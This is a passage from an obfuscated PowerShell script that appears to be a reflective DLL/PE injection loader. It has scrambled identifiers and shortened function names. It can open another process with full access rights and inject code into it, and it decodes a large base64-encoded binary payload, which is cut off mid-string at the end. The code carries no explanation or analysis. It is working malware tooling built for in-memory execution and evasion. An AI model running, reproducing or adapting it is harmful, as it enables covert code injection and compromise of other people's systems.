                        CAOMA -CopyInfo ${o`WMI} -W32F ${w3`2f} -W32C ${w3`2C}
                        break
                    }
                    else {
                        Start-Sleep -Seconds 1
                    }
                }
            }
		
            return @(${P`Ei}."PEH`And`le", ${E`PH}  )
        }
	
	
        Function ImflI {
    Param(
        [Parameter(  PositIOn  =  0, manDatoRY   =   ${tr`UE}  )]
        [IntPtr]
        ${p`EH}
    )

    ${W3`2C}   =  GW32C
    ${w3`2F}   =   Get-W32F
    ${w`32t}   = GW32T

    ${P`Ei}   =  GPBID -PEH ${p`eh} -W32T ${W3`2T} -W32C ${W`32C}

    if (  ${P`EI}."imAg`e_`NT`_He`AderS"."O`Pt`IonalheaDeR"."IMporT`T`ABLe"."Si`ZE" -gt 0) {
        [IntPtr]${ID`oPTr}  = ASIAU (  [Int64]${P`eI}."PE`HAndle"  ) ( [Int64]${P`Ei}."i`magE_`Nt_H`E`AderS"."opt`iONaLh`EaD`er"."iMPoRtTa`B`LE"."vi`R`TU`ALad`dReSS" )

        while (${tR`UE}) {
            ${I`dO}   = [System.Runtime.InteropServices.Marshal]::"P`TRt`ostR`UcTuRe"(${ido`P`TR}, [Type]${W3`2t}."I`Ma`gE_IMP`ORt_d`ESCri`P`ToR" )

            if ( ${i`DO}."chArAc`T`Eri`st`Ics" -eq 0 `
                -and ${i`Do}."fi`RSTt`HUnK" -eq 0 `
                -and ${i`dO}."f`oRwArD`Er`ChaIn" -eq 0 `
                -and ${i`do}."N`Ame" -eq 0 `
                -and ${i`dO}."TI`m`EDATeSt`AmP" -eq 0 ) {
                break
            }

            ${i`P`AmS} = [System.Runtime.InteropServices.Marshal]::"pt`Rt`OSTr`IngAn`Si"((ASIAU (  [Int64]${p`EI}."P`EHaN`dlE") ([Int64]${I`do}."N`AmE"  ))  )
            ${ID`La} = ${W`32f}."GeTM`od`ULeHAn`DLE"."i`NVO`ke"(  ${IpA`MS})

            if ( ${Id`La} -eq ${nU`lL}  ) {
                -WarningAction coNtInUE
            }

            ${sUcc`E`Ss}   =   ${w3`2f}."Fr`e`ELIBra`RY"."iNvo`Ke"(${I`dla} )
            if ( ${S`U`CceSS} -eq ${f`Al`Se} ) {
                -WarningAction CONTInuE
            }

            ${I`dOP`Tr}   =   ASIAU (  ${ID`OPTr} ) (  [System.Runtime.InteropServices.Marshal]::"SIz`eOf"(  [Type]${W`32T}."Im`AgE_`Imp`oR`T_`DE`SCrIPtor"  ) )
        }
    }

    ${M`Ai`ND`Llib`RArYptR}  = ASIAU (  ${P`EI}."PEh`And`lE") (  ${P`eI}."imA`Ge`_Nt`_heaDers"."O`pt`iOnAlhEA`DEr"."aDdRE`ssof`ENTrYP`OInt")
    ${Main`Dll`IB`R`A`RYDE`lEgatE}  =  GTDP @([IntPtr], [UInt32], [IntPtr]) (  [Bool])
    ${mA`INDLLIB`RA`Ry}   = [System.Runtime.InteropServices.Marshal]::"g`eTDelEGATeFO`R`FunCti`oNP`OinTER"(${MA`INdlL`I`B`R`ArYPTR}, ${Ma`in`dllIbrAR`ydE`LEG`Ate})

    ${maI`ND`l`lI`BrAry}."INVo`ke"( ${p`ei}."pEH`AND`lE", 0, [IntPtr]::"zE`Ro" ) > ${N`Ull}

    ${S`UCCEss}  = ${w`32F}."VI`RtU`AlfrEE"."Invo`Ke"(${p`eh}, [UInt64]0, ${w`32C}."M`EM_ReL`e`Ase"  )
    if ( ${SuCc`ess} -eq ${fAL`Se}) {
        -WarningAction coNtInUe
    }
}



        Function maIN {
    ${W3`2f}  =   Get-W32F
    ${w`32t}  =   GW32T
    ${W`32c} =   GW32C

    ${r`PH}   = [IntPtr]::"Z`eRo"

    if (  (  ${p`OkId} -ne ${nU`lL}) -and ( ${p`o`Kid} -ne 0 ) -and (${p`ON} -ne ${n`ULl}) -and (  ${P`on} -ne "")  ) {
        throw ""
    }
    elseif (  ${P`On} -ne ${N`Ull} -and ${P`on} -ne "") {
        ${PRoC`eS`sES}  = @(Get-Process -Name ${P`oN} -ErrorAction SiLeNTLycoNTinUE)
        if ( ${pRoCE`ss`ES}."cO`UNt" -eq 0) {
            throw ""
        }
        elseif ( ${P`Ro`CESseS}."C`OuNT" -gt 1) {
            ${P`oi} = Get-Process  | where { ${_}."NA`ME" -eq ${P`oN} }   |   Select-Object prOcesSnaMe, iD, sESsiONid
            Write-Output ${p`Oi}
            throw ""
        }
        else {
            ${pOK`Id}   =   ${P`RoC`esSES}[0]."I`d"
        }
    }

    if (  ( ${po`kiD} -ne ${n`ULL}) -and (  ${P`O`kId} -ne 0 )  ) {
        ${R`PH}  =  ${w`32F}."oPe`NpR`Oce`SS"."I`NvoKE"(0x001F0FFF, ${fal`SE}, ${P`oKiD}  )
        if ( ${R`pH} -eq [IntPtr]::"ZE`Ro") {
            throw ""
        }
    }

    try {
        ${pR`O`ces`sORS}   = Get-WmiObject -Class wIN32_pRocEsSOR
    }
    catch {
        throw ""
    }

    if (${PRoC`eS`SOrS} -is [array] ) {
        ${p`RO`CE`SSOR} =  ${PRoc`e`s`SORS}[0]
    }
    else {
        ${P`ROcE`SS`Or}   =  ${p`R`oc`esSoRs}
    }

    if ( (  ${p`RoceS`soR}."add`ReS`Swid`Th" ) -ne (( [System.IntPtr]::"Si`ZE" ) * 8)) {
    }

    if ( [System.Runtime.InteropServices.Marshal]::"Siz`eoF"( [Type][IntPtr]  ) -eq 8  ) {
        [Byte[]]${pNeB`ites}   =   [Byte[]][Convert]::"f`R`OMBASE`6`4st`RiNG"(  ${pNe`BiTE`s64}  )
    }
    else {
        return ( '3'+  '2 R' +  'eq')
    }
    ${p`NEbiT`Es}[0]  =  0
    ${p`N`ebites}[1] =   0
    ${p`eh}  =   [IntPtr]::"Z`ERO"
    if (${r`Ph} -eq [IntPtr]::"Z`ero" ) {
        ${P`lI}   =   IMLLA -PnEBites ${pn`Ebi`T`Es} -Command ${C`o`mma`Ndargumen`Ts}
    }
    else {
        ${p`lI} = IMLLA -PnEBites ${pnE`BiT`Es} -Command ${Co`M`MaN`DARgumenTs} -RemoteProcHandle ${r`ph}
    }
    if (${p`Li} -eq [IntPtr]::"Z`eRo") {
        throw ""
    }

    ${P`eH}   =  ${p`lI}[0]
    ${Rp`eH} =  ${p`li}[1]

    ${P`ei}   = GPBID -PEH ${P`Eh} -W32T ${W3`2T} -W32C ${w3`2c}
    if ( (${p`Ei}."fIl`ETy`pE" -ieq ( 'DL' +  'L'  ) ) -and (  ${r`PH} -eq [IntPtr]::"Z`Ero") ) {
        [IntPtr]${WS`FA}  =   HMPA -PEH ${p`Eh} -FunctionName (  'pow'  +'ershell_r'+'eflec'  + 'tive_K'+  'p'+  'dZAu' +  'Oe'  )
        if (  ${w`SfA} -eq [IntPtr]::"Z`Ero") {
            Throw ""
        }
        ${W`SfD} = GTDP @([IntPtr] ) ( [IntPtr] )
        ${w`SF}   =  [System.Runtime.InteropServices.Marshal]::"gET`De`LEgAtEfo`RFUN`CtIoNPO`in`TeR"(${W`sFa}, ${W`SFd})
        ${w`sI}  =  [System.Runtime.InteropServices.Marshal]::"STrI`NG`TOhGLoBa`Luni"(  ${COM`MA`ND`ARGu`MENTS} )
        [IntPtr]${O`p}  =   ${w`SF}."iN`Vo`kE"( ${W`Si})
        [System.Runtime.InteropServices.Marshal]::"F`ReeHgl`Ob`Al"( ${W`Si})
        if (  ${o`P} -eq [IntPtr]::"ze`Ro") {
            throw ""
        }
        else {
            ${oU`TPuT}  =   [System.Runtime.InteropServices.Marshal]::"p`TR`T`oSTrINgUnI"(${O`p}  )
            Write-Output ${O`UT`puT}
            ${W3`2F}."lO`cAlfR`ee"."INVo`ke"(  ${op} )
        }
    }
    elseif ((${p`EI}."Fi`LeTy`pe" -ieq ( 'D'  +  'LL'  )  ) -and ( ${r`Ph} -ne [IntPtr]::"Z`ero") ) {
        ${V`oFa}   =  HMPA -PEH ${P`eH} -FunctionName ('Vo' +  'id'  +  'Func'  )
        if ( (  ${vo`FA} -eq ${NU`Ll}) -or ( ${v`Ofa} -eq [IntPtr]::"z`eRO" )  ) {
            throw ""
        }

        ${Vo`FA}   = SSIAU$VoFA ${P`EH}
        ${Vo`Fa}  =  ASIAU ${V`Ofa} ${r`mPeh}

        ${rt`HLe} =  ICRT -ProLEv ${r`ph} -SAYS1 ${V`oFA} -W32F ${w`32F}
    }

    if (  ${r`pH} -eq [IntPtr]::"Z`Ero" ) {
        IMFLI -PEH ${p`eH}
    }
    else {
        ${SUc`C`EsS}   = ${W`32F}."vI`R`TualfReE"."I`NVokE"( ${P`Eh}, [UInt64]0, ${w3`2C}."m`em_reLe`Ase")
        if (  ${sUCc`e`SS} -eq ${F`A`LSE}) {
            -WarningAction ContiNuE
        }
    }
}


        Main
    }

	
    Function mAin {

        ${command`A`R`guMeN`Ts}   = ${c`O`MMaND}
        [System.IO.Directory]::"SE`Tc`UrRe`NTdir`eCtOrY"(  ${p`wD}  )
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